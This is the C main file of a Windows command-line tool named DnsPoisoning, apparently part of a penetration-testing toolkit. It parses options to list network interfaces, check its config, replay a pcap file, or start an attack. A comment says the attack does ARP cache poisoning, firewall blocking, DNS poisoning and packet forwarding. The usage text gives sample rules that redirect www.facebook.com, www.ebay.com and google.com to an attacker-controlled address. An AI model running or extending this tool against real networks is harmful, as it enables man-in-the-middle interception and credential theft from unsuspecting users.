#include <stdio.h>
#include <stdio.h>
#include <string.h>
#include <Shlwapi.h>
#include <stdarg.h>

#include "DnsPoisoning.h"
#include "getopt.h"
#include "Interface.h"
#include "LinkedListSpoofedDnsHosts.h"
#include "LinkedListTargetSystems.h"
#include "Logging.h"
#include "ModePcap.h"
#include "ModeDnsPoisoning.h"

#pragma comment(lib, "wpcap.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "IPHLPAPI.lib")

/*
 * Extern variables
 *
 */
extern char *optarg;


/*
 * Global variables
 *
 */
CRITICAL_SECTION csSystemsLL;

// Linked lists
PHOSTNODE gDnsSpoofingList = NULL;
PSYSNODE gTargetSystemsList = NULL;

int gDEBUGLEVEL = DEBUG_LEVEL;
SCANPARAMS gScanParams;
char **gARGV = NULL;


/*
 *
 * Main:  Program entry point
 *
 */
int main(int argc, char **argv)
{
  int retVal = 0;
  int opt = 0;
  char action = 0;

  if (InitLogging() == FALSE)
  {
    printf("main(): Logging initialization failed!");
    exit(1);
  }

  // Initialisation
  if (!InitializeCriticalSectionAndSpinCount(&csSystemsLL, 0x00000400))
  {
    retVal = 1;
    goto END;
  }
  
  gTargetSystemsList = InitSystemList();
  gDnsSpoofingList = InitHostsList();
  
  // Parse command line parameters
  while ((opt = getopt(argc, argv, ":lf:x:s:")) != -1)
  {
    switch (opt)
    {
    case 'l':
      if (argc == 2)
      {
        action = 'l';
      }
      break;

    case 's':
      if (argc == 3)
      {
        action = 's';
        strncpy(gScanParams.InterfaceName, optarg, sizeof(gScanParams.InterfaceName) - 1);
        GetInterfaceName(optarg, (char*)gScanParams.InterfaceName, sizeof(gScanParams.InterfaceName) - 1);
        GetInterfaceDetails(optarg, &gScanParams);
      }
      break;
    case 'x':
      if (argc == 3)
      {
        action = 'x';
        strncpy(gScanParams.InterfaceName, optarg, sizeof(gScanParams.InterfaceName) - 1);
        GetInterfaceName(optarg, (char *)gScanParams.InterfaceName, sizeof(gScanParams.InterfaceName) - 1);
        GetInterfaceDetails(optarg, &gScanParams);
      }
      break;
    case 'f':
      if (argc == 4)
      {
        action = 'f';
        strncpy(gScanParams.PcapFilePath, optarg, sizeof(gScanParams.PcapFilePath) - 1);
        strncpy(gScanParams.InterfaceName, argv[3], sizeof(gScanParams.InterfaceName) - 1);
        GetInterfaceName(gScanParams.InterfaceName, (char *)gScanParams.InterfaceName, sizeof(gScanParams.InterfaceName) - 1);
        GetInterfaceDetails(gScanParams.InterfaceName, &gScanParams);
      }
      break;
    }
  }

  // List all interfaces
  if (action == 'l')
  {
    ListInterfaceDetails();
    goto END;


  // Self check. Parse config file and check selected interface
  } 
  else if (action == 's')
  {
    ParseDnsPoisoningConfigFile(FILE_DNS_POISONING);
    ParseTargetHostsConfigFile(FILE_HOST_TARGETS);

    PrintTargetSystems(gTargetSystemsList);
    PrintDnsSpoofingRulesNodes(gDnsSpoofingList);


    goto END;

  // Process data from pcap data dump file
  }
  else if (action == 'f')
  {
    LogMsg(2, "main(): -f %s pcapFile=%s", gScanParams.InterfaceName, gScanParams.PcapFilePath);
    InitializeParsePcapDumpFile();

  // Start ...
  //  - ARP cache poisoning
  //  - Firewall blocking
  //  - DNS poisoning 
  //  - forwarding data packets
  }
  else if (action == 'x')
  {
    InitializeDP();
  }
  else
  {
    PrintUsage(argv[0]);
  }

END:

  DeleteCriticalSection(&csSystemsLL);
  LogMsg(DBG_LOW, "main(): Stopping %s", argv[0]);
  StopLogging();

  return retVal;
}


void Stringify(unsigned char *inputParam, int inputLenthParam, unsigned char *outputParam)
{
  int counter = 0;

  if (inputParam == NULL || outputParam == NULL)
  {
    return;
  }

  for (; counter < inputLenthParam && inputParam[counter] != '\0'; counter++)
  {
    //    if (pInput[lCounter] < 32 || pInput[lCounter] > 176)
    if (inputParam[counter] < 32 || inputParam[counter] > 126)
    {
      outputParam[counter] = '.';
    }
    else
    {
      outputParam[counter] = inputParam[counter];
    }
  }
}


void PrintUsage(char *pAppName)
{
  system("cls");
  printf("\nDnsPoisoning Version %s\n", DNSPOISONING_VERSION);
  printf("------------------------\n\n");
  printf("List all interfaces               :  %s -l\n", pAppName);
  printf("Self check                        :  %s -s IFC-Name\n", pAppName);
  printf("Start poisoning                   :  %s -x IFC-Name\n", pAppName);
  printf("Parse packets from pcap file      :  %s -f datadump.pcap IFC-Name\n", pAppName);
  printf("\n\n\nAdd the DNS poisoning target host names and the spoofed IP \naddresses to the file .dnshosts\n\n");
  printf("y,www.facebook.com,A,120,192.168.0.58,\n");
  printf("y,www.ebay.com,A,120,192.168.0.58\n");
  printf("y,*google.com,CNAME,20,google.minary.io,192.168.0.58\n");
  printf("\n\n\n\nExamples\n--------\n\n");
  printf("Example : %s -x 0F716AAF-D4A7-ACBA-1234-EA45A939F624\n", pAppName);
  printf("Example : %s -f datadump.pcap\n\n\n\n", pAppName);
  printf("WinPcap version\n---------------\n\n");
  printf("%s\n\n", pcap_lib_version());
}


BOOL DnsPoisoning_ControlHandler(DWORD pControlType)
{
  switch (pControlType)
  {
    // Handle the CTRL-C signal. 
  case CTRL_C_EVENT:
    LogMsg(DBG_INFO, "Ctrl-C event : Exiting process");
    return FALSE;

  case CTRL_CLOSE_EVENT:
    LogMsg(DBG_INFO, "Ctrl-Close event : Exiting process");
    return FALSE;

  case CTRL_BREAK_EVENT:
    LogMsg(DBG_INFO, "Ctrl-Break event : Exiting process");
    return FALSE;

  case CTRL_LOGOFF_EVENT:
    printf("Ctrl-Logoff event : Exiting process");
    return FALSE;

  case CTRL_SHUTDOWN_EVENT:
    LogMsg(DBG_INFO, "Ctrl-Shutdown event : Exiting process");
    return FALSE;

  default:
    LogMsg(DBG_INFO, "Unknown event \"%d\" : Exiting process", pControlType);
    return FALSE;
  }
}
